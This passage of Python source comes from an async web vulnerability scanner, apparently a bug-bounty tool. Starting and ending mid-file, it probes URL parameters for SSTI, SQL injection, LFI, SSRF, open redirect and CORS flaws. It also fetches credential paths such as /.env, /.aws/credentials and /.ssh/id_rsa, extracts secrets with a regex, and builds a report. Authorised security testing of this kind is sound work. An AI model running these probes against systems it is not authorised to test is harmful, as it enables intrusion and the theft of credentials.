        await asyncio.gather(*[scan_url(u) for u in param_urls])

    print(f"  {OK} XSS done — {found} confirmed findings")


async def scan_ssti_async(param_urls, delay=0, concurrency=20):
    print(f"  {INFO} SSTI scanning ({len(param_urls)} URLs)…")
    found = 0
    sem   = asyncio.Semaphore(concurrency)

    async with httpx.AsyncClient(
        verify=False, follow_redirects=True, timeout=10, headers=DEFAULT_HEADERS,
        limits=httpx.Limits(max_connections=concurrency + 10, max_keepalive_connections=10),
    ) as client:

        async def scan_url(url):
            nonlocal found
            params = get_params(url)
            if not params: return
            async with sem:
                baseline = await async_get(url, client=client)
            if not baseline: return
            baseline_body = baseline.text

            for param in params:
                # Canary check
                canary = f"SSTIC{uuid.uuid4().hex[:6].upper()}"
                async with sem:
                    r_c = await async_get(build_fuzz_url(url, param, canary), client=client)
                if not r_c or canary not in r_c.text:
                    continue

                confirmed = False
                for payload, expected_list in SSTI_PAYLOADS.items():
                    if confirmed: break
                    async with sem:
                        if delay: await asyncio.sleep(delay)
                        r = await async_get(build_fuzz_url(url, param, canary + payload), client=client)
                    if not r: continue

                    matched = next((e for e in expected_list if (canary + e) in r.text), None)
                    if not matched: continue

                    # Double-confirm with different expression
                    async with sem:
                        r2 = await async_get(build_fuzz_url(url, param, canary + "{{45*45}}"), client=client)
                    if not r2 or (canary + "2025") not in r2.text:
                        async with sem:
                            r2 = await async_get(build_fuzz_url(url, param, canary + "${45*45}"), client=client)
                        if not r2 or (canary + "2025") not in r2.text: continue

                    # Triple-confirm
                    async with sem:
                        r3 = await async_get(build_fuzz_url(url, param, canary + "{{91*91}}"), client=client)
                    engine = "Jinja2/Twig" if (r3 and (canary + "8281") in r3.text) else "EL/Freemarker"

                    idx      = r.text.find(canary + matched)
                    evidence = r.text[max(0, idx - 50): idx + 80]
                    add_finding(
                        "SSTI (Server-Side Template Injection)", "critical",
                        build_fuzz_url(url, param, canary + payload),
                        f"Param '{param}': {payload!r}→'{matched}' (triple-confirmed). Engine: {engine}",
                        evidence, confidence="confirmed",
                    )
                    found += 1
                    confirmed = True

        await asyncio.gather(*[scan_url(u) for u in param_urls])

    print(f"  {OK} SSTI done — {found} confirmed findings")


async def scan_sqli_async(param_urls, delay=0, concurrency=20):
    print(f"  {INFO} SQLi scanning ({len(param_urls)} URLs)…")
    found = 0
    sem   = asyncio.Semaphore(concurrency)

    async with httpx.AsyncClient(
        verify=False, follow_redirects=True, timeout=15, headers=DEFAULT_HEADERS,
        limits=httpx.Limits(max_connections=concurrency + 10, max_keepalive_connections=10),
    ) as client:

        async def scan_url(url):
            nonlocal found
            params = get_params(url)
            if not params: return
            async with sem:
                baseline = await async_get(url, client=client)
            if not baseline: return
            baseline_body = baseline.text.lower()
            already_found = False

            for param in params:
                if already_found: break

                # Error-based
                for payload in SQLI_ERROR_PAYLOADS:
                    if already_found: break
                    async with sem:
                        if delay: await asyncio.sleep(delay)
                        r = await async_get(build_fuzz_url(url, param, payload), client=client)
                    if not r: continue

                    body_lower = r.text.lower()
                    matched_db = matched_err = None
                    for err_sig, db_name in SQLI_ERRORS.items():
                        if err_sig in body_lower and err_sig not in baseline_body:
                            matched_db, matched_err = db_name, err_sig
                            break
                    if not matched_err: continue

                    # Benign check + double-confirm in parallel
                    async with sem:
                        r_benign, r_alt = await asyncio.gather(
                            async_get(build_fuzz_url(url, param, "normalvalue123"), client=client),
                            async_get(build_fuzz_url(url, param, "'\""), client=client),
                        )
                    if r_benign and matched_err in r_benign.text.lower():
                        continue
                    if not r_alt or matched_err not in r_alt.text.lower():
                        continue

                    idx = r.text.lower().find(matched_err)
                    add_finding(
                        f"SQL Injection (Error-based — {matched_db})", "high",
                        build_fuzz_url(url, param, payload),
                        f"Param '{param}': {matched_db} error with {payload!r}. Error: {matched_err!r}",
                        r.text[max(0, idx - 50): idx + 200], confidence="confirmed",
                    )
                    found += 1
                    already_found = True
                    break

                # Time-based (only if no error-based found)
                if already_found: break
                # Measure baseline times in parallel
                async with sem:
                    baseline_resps = await asyncio.gather(
                        *[async_get(url, client=client) for _ in range(3)],
                        return_exceptions=True
                    )
                baseline_times = [
                    r.elapsed.total_seconds() for r in baseline_resps
                    if isinstance(r, httpx.Response)
                ]
                if len(baseline_times) < 2: continue
                bmed    = statistics.median(baseline_times)
                bstdev  = statistics.stdev(baseline_times) if len(baseline_times) > 1 else 0
                thresh  = max(bmed * 4, bstdev * 6)

                for payload, expected_delay, db in SQLI_TIME_PAYLOADS:
                    if already_found: break
                    async with sem:
                        if delay: await asyncio.sleep(delay)
                        r = await async_get(build_fuzz_url(url, param, payload), client=client)
                    if not r: continue
                    actual = r.elapsed.total_seconds()
                    if actual < expected_delay or actual < thresh: continue

                    # Triple-confirm
                    confirm_count = 0
                    for _ in range(3):
                        async with sem:
                            rc = await async_get(build_fuzz_url(url, param, payload), client=client)
                        if rc and rc.elapsed.total_seconds() >= expected_delay * 0.8:
                            confirm_count += 1
                        await asyncio.sleep(0.3)

                    if confirm_count < 2: continue
                    add_finding(
                        f"SQL Injection (Time-based Blind — {db})", "high",
                        build_fuzz_url(url, param, payload),
                        f"Param '{param}': {actual:.2f}s delay (baseline {bmed:.2f}s ± {bstdev:.2f}s). "
                        f"Confirmed {confirm_count}/3.",
                        f"Payload: {payload}", confidence="confirmed",
                    )
                    found += 1
                    already_found = True

        await asyncio.gather(*[scan_url(u) for u in param_urls])

    print(f"  {OK} SQLi done — {found} confirmed findings")


async def scan_lfi_async(param_urls, delay=0, concurrency=25):
    print(f"  {INFO} LFI scanning ({len(param_urls)} URLs)…")
    found = 0
    sem   = asyncio.Semaphore(concurrency)

    async with httpx.AsyncClient(
        verify=False, follow_redirects=True, timeout=10, headers=DEFAULT_HEADERS,
        limits=httpx.Limits(max_connections=concurrency + 10, max_keepalive_connections=10),
    ) as client:

        async def scan_url(url):
            nonlocal found
            params = get_params(url)
            if not params: return
            async with sem:
                baseline = await async_get(url, client=client)
            if not baseline: return
            baseline_body = baseline.text
            already_found = False

            for param in params:
                if already_found: break
                for payload in LFI_PAYLOADS:
                    if already_found: break
                    async with sem:
                        if delay: await asyncio.sleep(delay)
                        r = await async_get(build_fuzz_url(url, param, payload), client=client)
                    if not r or r.status_code not in (200, 500): continue
                    body = r.text

                    if "php://filter" in payload:
                        if r.status_code == 200:
                            for b64 in re.findall(r'[A-Za-z0-9+/]{100,}={0,2}', body):
                                try:
                                    decoded = base64.b64decode(b64).decode(errors="replace")
                                    if ("<?php" in decoded or "<?=" in decoded) and len(decoded) > 50:
                                        add_finding(
                                            "LFI via PHP Filter (Source Disclosure)", "critical",
                                            build_fuzz_url(url, param, payload),
                                            f"Param '{param}': PHP source leaked. Snippet: {decoded[:80]!r}",
                                            decoded[:300], confidence="confirmed",
                                        )
                                        found += 1
                                        already_found = True
                                        break
                                except Exception:
                                    pass
                        continue

                    for category, sigs in LFI_SIGNATURES.items():
                        matched = [s for s in sigs if s in body and s not in baseline_body]
                        if len(matched) < 2: continue

                        # Double-confirm with alternate traversal
                        alt = payload.replace("../../../../", "../../../../../../../")
                        async with sem:
                            r2 = await async_get(build_fuzz_url(url, param, alt), client=client)
                        matched2 = [s for s in sigs if r2 and s in r2.text and s not in baseline_body]
                        if len(matched2) < 1: continue

                        idx      = body.find(matched[0])
                        evidence = body[max(0, idx - 20): idx + 200]
                        add_finding(
                            "Local File Inclusion (LFI)", "critical",
                            build_fuzz_url(url, param, payload),
                            f"Param '{param}': {category} — {len(matched)} signatures: {matched[:3]}",
                            evidence, confidence="confirmed",
                        )
                        found += 1
                        already_found = True
                        break

        await asyncio.gather(*[scan_url(u) for u in param_urls])

    print(f"  {OK} LFI done — {found} confirmed findings")


async def scan_ssrf_async(param_urls, delay=0, concurrency=20):
    print(f"  {INFO} SSRF scanning…")
    found = 0
    sem   = asyncio.Semaphore(concurrency)

    async with httpx.AsyncClient(
        verify=False, follow_redirects=True, timeout=10, headers=DEFAULT_HEADERS,
        limits=httpx.Limits(max_connections=concurrency + 10, max_keepalive_connections=10),
    ) as client:

        async def scan_url(url):
            nonlocal found
            params = get_params(url)
            ssrf_params = [p for p in params if p.lower() in SSRF_PARAMS]
            if not ssrf_params: return
            async with sem:
                baseline = await async_get(url, client=client)
            if not baseline: return
            baseline_body  = baseline.text.lower()
            baseline_len   = len(baseline.content)

            for param in ssrf_params:
                already_found = False
                for payload_url, required_sigs, min_matches in SSRF_PAYLOADS:
                    if already_found: break
                    async with sem:
                        if delay: await asyncio.sleep(delay)
                        r = await async_get(build_fuzz_url(url, param, payload_url), client=client)
                    if not r: continue

                    body_lower = r.text.lower()
                    matched = [s for s in required_sigs if s.lower() in body_lower and s.lower() not in baseline_body]
                    if len(matched) < min_matches: continue
                    if abs(len(r.content) - baseline_len) < 50: continue

                    async with sem:
                        r2 = await async_get(build_fuzz_url(url, param, payload_url), client=client)
                    if not r2: continue
                    matched2 = [s for s in required_sigs if s.lower() in r2.text.lower() and s.lower() not in baseline_body]
                    if len(matched2) < min_matches: continue

                    add_finding(
                        "SSRF (Server-Side Request Forgery)", "critical",
                        build_fuzz_url(url, param, payload_url),
                        f"Param '{param}' fetched {payload_url}. Signatures: {matched}. Double-confirmed.",
                        r.text[:400], confidence="confirmed",
                    )
                    found += 1
                    already_found = True

        await asyncio.gather(*[scan_url(u) for u in param_urls])

    print(f"  {OK} SSRF done — {found} confirmed findings")


async def scan_open_redirect_async(param_urls, delay=0, concurrency=30):
    print(f"  {INFO} Open Redirect scanning…")
    found = 0
    sem   = asyncio.Semaphore(concurrency)
    REDIR_DOMAIN = "evil-redir-test.com"

    async with httpx.AsyncClient(
        verify=False, follow_redirects=True, timeout=8, headers=DEFAULT_HEADERS,
        limits=httpx.Limits(max_connections=concurrency + 10, max_keepalive_connections=10),
    ) as client_follow, httpx.AsyncClient(
        verify=False, follow_redirects=False, timeout=8, headers=DEFAULT_HEADERS,
        limits=httpx.Limits(max_connections=concurrency + 10, max_keepalive_connections=10),
    ) as client_nofollow:

        async def scan_url(url):
            nonlocal found
            params = get_params(url)
            redir_params = [p for p in params if p.lower() in REDIRECT_PARAMS]
            if not redir_params: return

            for param in redir_params:
                already_found = False
                for payload in OPEN_REDIRECT_PAYLOADS:
                    if already_found: break
                    fuzzed = build_fuzz_url(url, param, payload)
                    async with sem:
                        if delay: await asyncio.sleep(delay)
                        r = await async_get(fuzzed, client=client_follow)
                    if r and urllib.parse.urlparse(str(r.url)).netloc == REDIR_DOMAIN:
                        add_finding(
                            "Open Redirect", "medium", fuzzed,
                            f"Param '{param}': redirected to {r.url}",
                            f"Final URL: {r.url}", confidence="confirmed",
                        )
                        found += 1
                        already_found = True
                        continue

                    # Check via Location header (no follow)
                    try:
                        async with sem:
                            r_nf = await client_nofollow.get(fuzzed, timeout=8, headers=DEFAULT_HEADERS)
                        loc = r_nf.headers.get("location", "")
                        if REDIR_DOMAIN not in loc or r_nf.status_code not in range(300, 400):
                            continue

                        # Double-confirm
                        fuzzed2 = build_fuzz_url(url, param, "//evil-redir-test.com/confirm")
                        async with sem:
                            r_nf2 = await client_nofollow.get(fuzzed2, timeout=8, headers=DEFAULT_HEADERS)
                        if REDIR_DOMAIN not in r_nf2.headers.get("location", ""):
                            continue

                        add_finding(
                            "Open Redirect", "medium", fuzzed,
                            f"Param '{param}': Location→{loc} (status {r_nf.status_code}). Double-confirmed.",
                            f"Location: {loc}", confidence="confirmed",
                        )
                        found += 1
                        already_found = True
                    except Exception:
                        pass

        await asyncio.gather(*[scan_url(u) for u in param_urls])

    print(f"  {OK} Open Redirect done — {found} confirmed findings")


async def scan_exposed_files_async(live_hosts, delay=0, concurrency=60):
    """Async exposed file scanner — all hosts × all paths in parallel."""
    print(f"  {INFO} Exposed files/paths scanning…")
    sem = asyncio.Semaphore(concurrency)

    PATHS = [
        "/.git/HEAD", "/.git/config", "/.git/COMMIT_EDITMSG",
        "/.env", "/.env.local", "/.env.backup", "/.env.production",
        "/config.php", "/wp-config.php", "/wp-config.php.bak",
        "/.aws/credentials", "/.ssh/id_rsa", "/.bash_history",
        "/backup.zip", "/backup.tar.gz", "/db_backup.sql", "/dump.sql",
        "/phpinfo.php", "/info.php", "/test.php",
        "/actuator", "/actuator/env", "/actuator/health", "/actuator/mappings",
        "/swagger-ui.html", "/swagger-ui/index.html", "/v2/api-docs", "/openapi.json",
        "/server-status", "/.DS_Store", "/robots.txt", "/.well-known/security.txt",
        "/phpmyadmin/", "/admin/", "/wp-admin/",
    ]

    async with httpx.AsyncClient(
        verify=False, follow_redirects=False, timeout=8, headers=DEFAULT_HEADERS,
        limits=httpx.Limits(max_connections=concurrency + 20, max_keepalive_connections=20),
    ) as client:

        async def check(host, path):
            url = host["url"].rstrip("/") + path
            async with sem:
                if delay: await asyncio.sleep(delay)
                try:
                    r = await client.get(url, timeout=8, headers=DEFAULT_HEADERS)
                except Exception:
                    return
            sc         = r.status_code
            body       = r.text
            body_lower = body.lower()
            content    = r.content

            if "/.git/" in path:
                if sc != 200: return
                inds = sum([
                    "ref: refs/" in body,
                    "[core]" in body,
                    "repositoryformatversion" in body_lower,
                    "filemode" in body_lower,
                ])
                if inds >= 2:
                    add_finding("Exposed .git Repository", "critical", url,
                                f"{inds} git indicators confirmed — source code recoverable.",
                                body[:300], confidence="confirmed")

            elif path.startswith("/.env"):
                if sc != 200: return
                if any(t in body_lower for t in ["<html", "<!doctype", "<body"]): return
                if "text/html" in r.headers.get("content-type", "").lower(): return
                secrets = re.findall(
                    r'^[ \t]*(?:export[ \t]+)?([A-Za-z0-9_]*(?:PASSWORD|SECRET|API_KEY|TOKEN|'
                    r'DATABASE_URL|AWS_ACCESS|AWS_SECRET|PRIVATE_KEY|JWT_)[A-Za-z0-9_]*)[ \t]*=[ \t]*(\S.*)$',
                    body, re.M | re.I
                )
                valid_kv = re.findall(r'^[A-Z_][A-Z0-9_]+=\S+', body, re.M)
                if secrets and len(valid_kv) >= 2:
                    parts = [f"{k}={v[:20]}..." for k, v in secrets[:3]]
                    add_finding("Exposed .env File — Secrets Leaked", "critical", url,
                                f"{len(secrets)} secret(s): {', '.join(parts)}",
                                body[:400], confidence="confirmed")

            elif path.endswith((".zip", ".tar.gz", ".sql", ".bak")):
                if sc != 200 or len(content) < 1024: return
                if content[:2] == b'PK':
                    add_finding("Exposed Backup File", "high", url,
                                f"ZIP file downloadable ({len(content)} bytes)", "", confidence="confirmed")
                elif content[:3] == b'\x1f\x8b\x08':
                    add_finding("Exposed Backup File", "high", url,
                                f"gzip archive downloadable ({len(content)} bytes)", "", confidence="confirmed")
                elif b'mysqldump' in content[:200] or b'CREATE TABLE' in content[:500]:
                    add_finding("Exposed Backup File", "high", url,
                                f"SQL dump downloadable ({len(content)} bytes)", "", confidence="confirmed")

            elif path in ("/phpinfo.php", "/info.php", "/test.php"):
                if sc != 200: return
                inds = sum(["PHP Version" in body, "php.ini" in body_lower,
                            "_SERVER" in body, "DOCUMENT_ROOT" in body])
                if inds >= 3:
                    ver = re.search(r'PHP Version\s+([\d.]+)', body)
                    add_finding("PHPInfo Exposed", "medium", url,
                                f"PHP {ver.group(1) if ver else '?'} config exposed. {inds}/4 indicators.",
                                "", confidence="confirmed")

            elif "actuator" in path:
                if sc != 200: return
                if path == "/actuator":
                    if '"_links"' in body and "self" in body_lower:
                        try:
                            data  = r.json()
                            links = data.get("_links", {})
                            sensitive = [k for k in links if k in (
                                "env", "beans", "heapdump", "threaddump", "logfile"
                            )]
                            if sensitive:
                                add_finding("Spring Actuator — Sensitive Endpoints", "medium", url,
                                            f"Exposed: {sensitive}", body[:300], confidence="confirmed")
                        except Exception:
                            pass
                elif "/env" in path:
                    if any(k in body_lower for k in ["applicationcontext", "datasource", "spring.datasource"]):
                        add_finding("Spring Actuator /env — Config Exposed", "high", url,
                                    "Application config including potential credentials accessible.",
                                    body[:400], confidence="confirmed")

            elif any(p in path for p in ("swagger", "api-docs", "openapi")):
                if sc != 200: return
                try:
                    data = r.json()
                    if "swagger" in data or "openapi" in data:
                        pc = len(data.get("paths", {}))
                        if pc > 0:
                            add_finding("API Docs Exposed (Swagger/OpenAPI)", "medium", url,
                                        f"{pc} endpoints in schema. Version: {data.get('swagger') or data.get('openapi','?')}",
                                        "", confidence="confirmed")
                except Exception:
                    if "swagger" in body_lower and "openapi" in body_lower:
                        add_finding("API Docs Exposed (Swagger/OpenAPI)", "medium", url,
                                    "API documentation accessible.", "", confidence="probable")

            elif path == "/server-status":
                if sc != 200: return
                inds = sum(k in body_lower for k in ["total accesses", "apache", "cpu load", "uptime"])
                if inds >= 3:
                    add_finding("Apache server-status Exposed", "medium", url,
                                f"{inds}/4 Apache indicators confirmed.", body[:200], confidence="confirmed")

            elif path == "/.DS_Store":
                if sc != 200 or len(content) < 4: return
                if content[:4] == b'\x00\x00\x00\x01':
                    add_finding("Exposed .DS_Store", "low", url,
                                f"macOS metadata leaks directory structure ({len(content)} bytes).",
                                "", confidence="confirmed")

        tasks = [check(host, path) for host in live_hosts for path in PATHS]
        await asyncio.gather(*tasks)

    print(f"  {OK} Exposed files scan done")


async def scan_cors_async(live_hosts, delay=0, concurrency=40):
    print(f"  {INFO} CORS scanning…")
    found     = 0
    sem       = asyncio.Semaphore(concurrency)
    EVIL_ORIG = "https://evil-cors-test.com"

    async with httpx.AsyncClient(
        verify=False, follow_redirects=True, timeout=8, headers=DEFAULT_HEADERS,
        limits=httpx.Limits(max_connections=concurrency + 10, max_keepalive_connections=10),
    ) as client:

        async def check(url):
            nonlocal found
            async with sem:
                if delay: await asyncio.sleep(delay)
                try:
                    r1 = await client.get(url, timeout=8, headers={**DEFAULT_HEADERS, "Origin": EVIL_ORIG})
                except Exception:
                    return
            acao = r1.headers.get("access-control-allow-origin", "")
            acac = r1.headers.get("access-control-allow-credentials", "").lower()

            if acao == EVIL_ORIG:
                async with sem:
                    try:
                        r2 = await client.get(url, timeout=8, headers={**DEFAULT_HEADERS, "Origin": EVIL_ORIG})
                    except Exception:
                        return
                if r2.headers.get("access-control-allow-origin") != EVIL_ORIG:
                    return
                sev = "high" if acac == "true" else "medium"
                add_finding("CORS — Arbitrary Origin Reflected", sev, url,
                            f"ACAO reflects evil origin. ACAC: {acac or 'absent'}. Double-confirmed.",
                            f"ACAO: {acao} | ACAC: {acac}", confidence="confirmed")
                found += 1
            elif acao == "*" and acac == "true":
                add_finding("CORS Wildcard with Credentials (Spec Violation)", "medium", url,
                            "ACAO=* with ACAC=true violates CORS spec.",
                            f"ACAO: {acao} | ACAC: {acac}", confidence="probable")
                found += 1
            else:
                async with sem:
                    try:
                        r_null = await client.get(url, timeout=8,
                                                   headers={**DEFAULT_HEADERS, "Origin": "null"})
                    except Exception:
                        return
                if r_null.headers.get("access-control-allow-origin") == "null":
                    add_finding("CORS Null Origin Reflected", "medium", url,
                                "null origin reflected — exploitable via sandboxed iframe.",
                                "", confidence="confirmed")
                    found += 1

        urls = []
        for h in live_hosts:
            base = h["url"]
            urls.extend([base] + [base.rstrip("/") + p for p in ["/api", "/api/v1", "/api/user"]])
        await asyncio.gather(*[check(u) for u in urls])

    print(f"  {OK} CORS done — {found} confirmed findings")


def scan_security_headers(live_hosts):
    """Sync — fast enough (one request per host)."""
    print(f"  {INFO} Security Headers check…")
    CHECKS = {
        "strict-transport-security": ("HSTS missing", "medium", True),
        "x-frame-options":           ("Clickjacking risk — no X-Frame-Options", "medium", False),
        "x-content-type-options":    ("MIME-sniffing enabled", "low", False),
        "content-security-policy":   ("No CSP header", "low", False),
    }
    client = get_sync_client()
    for host in live_hosts:
        url = host["url"]
        is_https = url.startswith("https://")
        try:
            r = client.get(url, timeout=8)
        except Exception:
            continue
        csp_val = r.headers.get("content-security-policy", "")
        has_fa  = "frame-ancestors" in csp_val
        for h_lower, (msg, sev, https_only) in CHECKS.items():
            if https_only and not is_https: continue
            if h_lower == "x-frame-options" and has_fa: continue
            if h_lower == "content-security-policy" and csp_val: continue
            if h_lower not in {k.lower() for k in r.headers}:
                add_finding(f"Missing Security Header: {h_lower.title()}", sev, url, msg,
                            confidence="confirmed")
    print(f"  {OK} Security headers done")


async def scan_subdomain_takeover_async(live_hosts):
    print(f"  {INFO} Subdomain takeover fingerprinting…")
    found = 0
    TAKEOVER_SIGS = {
        "GitHub Pages": (["There isn't a GitHub Pages site here"], 1),
        "AWS S3":       (["NoSuchBucket", "The specified bucket does not exist"], 1),
        "Heroku":       (["No such app", "herokucdn.com/error-pages"], 1),
        "Netlify":      (["Not Found - Request ID", "netlify"], 1),
        "Fastly":       (["Fastly error: unknown domain"], 1),
        "Surge.sh":     (["project not found", "surge.sh"], 1),
    }
    sem = asyncio.Semaphore(20)

    async with httpx.AsyncClient(
        verify=False, follow_redirects=True, timeout=8, headers=DEFAULT_HEADERS,
        limits=httpx.Limits(max_connections=30, max_keepalive_connections=10),
    ) as client:

        async def check(h):
            nonlocal found
            url = h["url"]
            async with sem:
                r = await async_get(url, client=client)
            if not r: return
            body = r.text

            for provider, (sigs, min_sigs) in TAKEOVER_SIGS.items():
                matched = [s for s in sigs if s.lower() in body.lower()]
                if len(matched) < min_sigs: continue
                async with sem:
                    r2 = await async_get(url, client=client)
                if not r2: continue
                matched2 = [s for s in sigs if s.lower() in r2.text.lower()]
                if len(matched2) < min_sigs: continue
                add_finding("Subdomain Takeover (Probable)", "high", url,
                            f"Provider: {provider}. Signatures: {matched}. Double-confirmed.",
                            body[:200], confidence="probable")
                found += 1
                break

        await asyncio.gather(*[check(h) for h in live_hosts])

    print(f"  {OK} Takeover scan done — {found} findings")


# ──────────────────────────────────────────────
#  7. NUCLEI
# ──────────────────────────────────────────────
def run_nuclei(live_hosts, severity="medium,high,critical", output_file="nuclei_out.txt"):
    print(f"\n{INFO} {C.BOLD}[NUCLEI] Running Nuclei (severity: {severity}){C.RESET}")
    try:
        subprocess.run(['nuclei', '--version'], capture_output=True, timeout=5)
    except FileNotFoundError:
        print(f"  {SKIP} nuclei not found in PATH — skip")
        return

    url_list = [h["url"] for h in live_hosts]
    if not url_list:
        print(f"  {WARN} No live hosts")
        return

    with tempfile.NamedTemporaryFile(mode='w', suffix='.txt', delete=False, prefix='nuclei_urls_') as tmp:
        tmp.write("\n".join(url_list))
        tmp_path = tmp.name

    jsonl_output = output_file.replace(".txt", ".jsonl")
    cmd = [
        'nuclei', '-l', tmp_path, '-severity', severity,
        '-o', output_file, '-jsonl', jsonl_output,
        '-nc', '-c', '25', '-timeout', '10', '-retries', '2', '-no-interactsh',
    ]

    # Find templates
    home = Path.home()
    for d in [home/"nuclei-templates", home/".local"/"share"/"nuclei"/"nuclei-templates"]:
        if d.exists():
            for sub in ['cves', 'exposures', 'misconfigurations', 'vulnerabilities']:
                p = d / sub
                if p.exists():
                    cmd += ['-t', str(p)]
            break

    print(f"  {INFO} Targets: {len(url_list)} URLs | Severity: {severity}")
    nuclei_count = 0
    try:
        proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
        for line in proc.stdout:
            line = line.strip()
            if line:
                nuclei_count += 1
                print(f"  {C.CYAN}[nuclei]{C.RESET} {line}")
        proc.wait()

        if Path(jsonl_output).exists():
            with open(jsonl_output, encoding="utf-8", errors="replace") as jf:
                for jline in jf:
                    try:
                        entry = json.loads(jline.strip())
                        info  = entry.get("info", {})
                        sev   = info.get("severity", "info").lower()
                        add_finding(
                            f"[Nuclei] {info.get('name', entry.get('template-id','?'))}",
                            sev, entry.get("matched-at", ""),
                            f"Template: {entry.get('template-id','?')} — {info.get('description','')[:200]}",
                            entry.get("curl-command", entry.get("response",""))[:300],
                            confidence="confirmed",
                        )
                    except json.JSONDecodeError:
                        pass
        print(f"  {OK} Nuclei done — {nuclei_count} findings → {output_file}")
    except Exception as e:
        print(f"  {ERR} Nuclei error: {e}")
    finally:
        try: Path(tmp_path).unlink()
        except Exception: pass


# ──────────────────────────────────────────────
#  8. REPORTS
# ──────────────────────────────────────────────
def save_json_report(out_dir):
    path = out_dir / "report.json"
    with open(path, "w", encoding="utf-8") as f:
        json.dump(STATE, f, indent=2, default=str)
    print(f"  {OK} JSON → {path}")

def save_html_report(out_dir):
    findings = sorted(STATE["findings"],
        key=lambda x: (SEVERITY_ORDER.get(x["severity"], 9),
                       {"confirmed": 0, "probable": 1, "potential": 2}.get(x.get("confidence",""), 3)))
    counts = {}
    for f in findings:
        counts[f["severity"]] = counts.get(f["severity"], 0) + 1

    rows_html = ""
    for f in findings:
        sev_color = {"critical":"#ff4444","high":"#ff8800","medium":"#ffcc00","low":"#44aaff","info":"#888"}.get(f["severity"],"#ccc")
        conf_color = {"confirmed":"#2cb67d","probable":"#ffcc00","potential":"#666"}.get(f.get("confidence",""),"#999")
        ev = (f.get("evidence") or "").replace("<","&lt;").replace(">","&gt;")
        rows_html += f"""
        <tr>
          <td><span class="badge" style="background:{sev_color}">{f['severity'].upper()}</span></td>
          <td><span class="conf-tag" style="color:{conf_color}">{f.get('confidence','?')}</span></td>
          <td><strong>{html_module.escape(f['type'])}</strong></td>
          <td><code class="url-cell">{html_module.escape(f['url'])}</code></td>
          <td>{html_module.escape(f.get('detail',''))}</td>
          <td><pre class="evidence">{ev[:300]}</pre></td>
          <td class="ts">{f['timestamp'][:19]}</td>
        </tr>"""

    sev_colors = {"critical":"#ff4444","high":"#ff8800","medium":"#ffcc00","low":"#44aaff","info":"#888"}
    stat_cards = "".join(
        f'<div class="stat-card" style="border-color:{sev_colors.get(s,"#ccc")}">'
        f'<div class="stat-num" style="color:{sev_colors.get(s,"#fff")}">{c}</div>'
        f'<div class="stat-label">{s.upper()}</div></div>'
        for s, c in sorted(counts.items(), key=lambda x: SEVERITY_ORDER.get(x[0], 9))
    )
    live_rows = "".join(
        f'<tr><td><code>{html_module.escape(h["url"])}</code></td>'
        f'<td style="color:{"#2cb67d" if h["status"]==200 else "#ffcc00"}">{h["status"]}</td>'
        f'<td>{html_module.escape(h["title"])}</td><td>{html_module.escape(h["server"])}</td></tr>'
        for h in STATE["live_hosts"]
    )
    port_rows = "".join(
        f'<tr><td>{html_module.escape(h)}</td><td>{p}</td><td>{SERVICE_HINTS.get(p,"?")}</td></tr>'
        for h, ports in STATE["open_ports"].items() for p in ports
    )
    confirmed_count = sum(1 for f in findings if f.get("confidence") == "confirmed")
    probable_count  = sum(1 for f in findings if f.get("confidence") == "probable")

    html = f"""<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>Bug Bounty Report — {html_module.escape(STATE['domain'])}</title>
<style>
  @import url('https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;700&family=Syne:wght@400;700;800&display=swap');
  :root {{--bg:#0a0a0f;--surface:#12121a;--border:#1e1e2e;--text:#e0e0f0;--dim:#666680;--accent:#7f5af0}}
  *{{box-sizing:border-box;margin:0;padding:0}}
  body{{background:var(--bg);color:var(--text);font-family:'Syne',sans-serif;line-height:1.6}}
  header{{background:linear-gradient(135deg,#0a0a0f,#1a0a2e);border-bottom:2px solid var(--accent);padding:40px 48px}}
  header h1{{font-size:2.4rem;font-weight:800;background:linear-gradient(90deg,#7f5af0,#2cb67d);-webkit-background-clip:text;-webkit-text-fill-color:transparent}}
  .meta{{color:var(--dim);font-size:.85rem;margin-top:8px;font-family:'JetBrains Mono',monospace}}
  main{{max-width:1400px;margin:0 auto;padding:40px 48px}}
  h2{{font-size:1.3rem;font-weight:700;color:var(--accent);border-bottom:1px solid var(--border);padding-bottom:8px;margin:40px 0 20px}}
  .stat-row{{display:flex;gap:16px;flex-wrap:wrap;margin-bottom:24px}}
  .stat-card{{background:var(--surface);border:2px solid;border-radius:12px;padding:20px 28px;min-width:110px;text-align:center}}
  .stat-num{{font-size:2.4rem;font-weight:800;font-family:'JetBrains Mono',monospace}}
  .stat-label{{font-size:.75rem;letter-spacing:2px;color:var(--dim);margin-top:4px}}
  table{{width:100%;border-collapse:collapse;font-size:.88rem}}
  thead tr{{background:var(--surface)}}
  th{{text-align:left;padding:10px 14px;color:var(--dim);font-size:.72rem;letter-spacing:1px;text-transform:uppercase}}
  td{{padding:10px 14px;border-bottom:1px solid var(--border);vertical-align:top}}
  tr:hover td{{background:rgba(127,90,240,.05)}}
  .badge{{display:inline-block;padding:2px 10px;border-radius:20px;font-size:.7rem;font-weight:700;letter-spacing:1px;font-family:'JetBrains Mono',monospace;color:#000}}
  .conf-tag{{font-family:'JetBrains Mono',monospace;font-size:.75rem;font-weight:700}}
  code{{font-family:'JetBrains Mono',monospace;font-size:.8rem;color:#a0d8ef;word-break:break-all}}
  pre.evidence{{font-family:'JetBrains Mono',monospace;font-size:.7rem;color:var(--dim);white-space:pre-wrap;word-break:break-all;max-height:80px;overflow:hidden}}
  .ts{{font-size:.72rem;color:var(--dim);white-space:nowrap}}
  .fp-note{{background:#1a1a0a;border:1px solid #ffcc00;border-radius:8px;padding:16px 20px;margin-bottom:24px;font-size:.85rem;color:#ffcc00}}
  footer{{text-align:center;padding:40px;color:var(--dim);font-size:.8rem;border-top:1px solid var(--border);margin-top:60px}}
</style>
</head>
<body>
<header>
  <h1>Bug Bounty Report</h1>
  <div class="meta">
    Target: <strong>{html_module.escape(STATE['domain'])}</strong> &nbsp;·&nbsp;
    Started: {STATE['started_at']} &nbsp;·&nbsp; Finished: {STATE['finished_at']} &nbsp;·&nbsp;
    Total Findings: {len(findings)}
  </div>
</header>
<main>
<div class="fp-note">⚡ <strong>Zero False Positive Mode (v4.0 Async)</strong> — 
All confirmed findings used multi-layer async verification. 
Probable findings have strong signatures but may need manual verification.</div>
<h2>Severity Breakdown</h2>
<div class="stat-row">{stat_cards}</div>
<p style="margin-bottom:16px;font-size:.9rem">
  ✅ <strong style="color:#2cb67d">{confirmed_count}</strong> Confirmed &nbsp;
